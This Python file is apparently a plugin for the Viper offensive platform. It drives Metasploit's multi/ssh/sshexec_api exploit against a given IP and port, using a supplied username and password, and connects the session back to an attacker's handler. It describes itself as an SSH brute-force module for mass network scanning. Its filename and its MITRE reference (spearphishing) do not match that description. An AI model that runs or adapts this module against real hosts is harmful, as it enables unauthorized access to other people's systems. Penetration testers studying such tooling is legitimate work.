# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :


from PostModule.module import *


class PostModule(BotMSFModule):
    NAME = "SSH暴力破解模块(beta)"
    DESC = "模块使用内置字典或用户自定义字典对指定地址进行暴力破解攻击.\n" \
           "(模块主要用于测试全网扫描功能)"
    MODULETYPE = TAG2CH.Bot_MSF_Exp
    REFERENCES = ["https://attack.mitre.org/techniques/T1193/"]
    AUTHOR = "Viper"
    SEARCH = ' protocol="SSH" '
    OPTIONS = register_options([
        OptionStr(name='Username', name_tag="用户名", required=True, desc="暴力破解用户名"),
        OptionStr(name='Password', name_tag="密码", required=True, desc="暴力破解密码"),
        OptionHander(),
    ])

    def __init__(self, ip, port, protocol, custom_param):
        super().__init__(ip, port, protocol, custom_param)
        self.type = "exploit"
        self.mname = "multi/ssh/sshexec_api"

    def check(self):
        """执行前的检查函数"""
        result = self.set_payload_by_handler()
        if result is not True:
            return False, "无法解析Handler,请选择正确的监听"
        else:
            Username = self.param("Username")
            Password = self.param("Password")
            self.set_option("USERNAME", Username)
            self.set_option("PASSWORD", Password)
            self.set_option("RHOSTS", self._ip)
            self.set_option("RPORT", self._port)
            return True, ""

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
